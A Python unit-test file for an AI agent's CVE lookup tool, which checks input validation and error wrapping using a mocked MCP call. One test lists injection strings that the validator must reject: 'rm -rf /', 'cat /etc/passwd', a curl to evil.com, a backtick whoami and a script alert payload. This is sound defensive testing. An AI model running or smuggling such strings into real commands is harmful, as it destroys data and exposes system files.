"""Unit tests for src.ai_core.agent.lookup_cve_tool.

Mocks call_mcp_tool so tests don't depend on a running mcp-cve container.
"""

from unittest.mock import AsyncMock

import pytest

from src.ai_core.agent.lookup_cve_tool import lookup_cve, LookupCveError


async def test_lookup_cve_id_format(monkeypatch):
    monkeypatch.setattr(
        "src.ai_core.agent.lookup_cve_tool.call_mcp_tool",
        AsyncMock(return_value=[{"id": "CVE-2021-44228", "description": "RCE in log4j"}]),
    )
    out = await lookup_cve("CVE-2021-44228")
    assert out[0]["id"] == "CVE-2021-44228"


async def test_lookup_cve_keyword(monkeypatch):
    monkeypatch.setattr(
        "src.ai_core.agent.lookup_cve_tool.call_mcp_tool",
        AsyncMock(return_value=[{"id": "CVE-2023-1", "description": "kubernetes RCE"}]),
    )
    out = await lookup_cve("kubernetes")
    assert len(out) == 1


async def test_lookup_cve_rejects_empty():
    with pytest.raises(LookupCveError, match="empty"):
        await lookup_cve("")


async def test_lookup_cve_rejects_whitespace_only():
    with pytest.raises(LookupCveError, match="empty"):
        await lookup_cve("   \n\t  ")


async def test_lookup_cve_rejects_oversized():
    with pytest.raises(LookupCveError, match="too long"):
        await lookup_cve("A" * 500)


async def test_lookup_cve_rejects_injection_chars():
    """<script>, semicolons, backticks etc — block at validator (LLM05)."""
    for bad in (
        "<script>alert(1)</script>",
        "log4j; rm -rf /",
        "CVE-2024-1 | cat /etc/passwd",
        "$(curl evil.com)",
        "log4j`whoami`",
    ):
        with pytest.raises(LookupCveError, match="unsupported"):
            await lookup_cve(bad)


async def test_lookup_cve_wraps_transport_error(monkeypatch):
    from src.ai_core.agent.mcp_client import MCPCallError

    monkeypatch.setattr(
        "src.ai_core.agent.lookup_cve_tool.call_mcp_tool",
        AsyncMock(side_effect=MCPCallError("mcp transport boom")),
    )
    with pytest.raises(LookupCveError, match="MCP"):
        await lookup_cve("CVE-2024-1")


async def test_lookup_cve_accepts_safe_keyword_charset(monkeypatch):
    """ASCII letters/digits/dash/dot/comma/space — пройдут."""
    monkeypatch.setattr(
        "src.ai_core.agent.lookup_cve_tool.call_mcp_tool",
        AsyncMock(return_value=[]),
    )
    # Не должен бросить — это безопасный запрос
    out = await lookup_cve("apache log4j 2.14.1")
    assert out == []
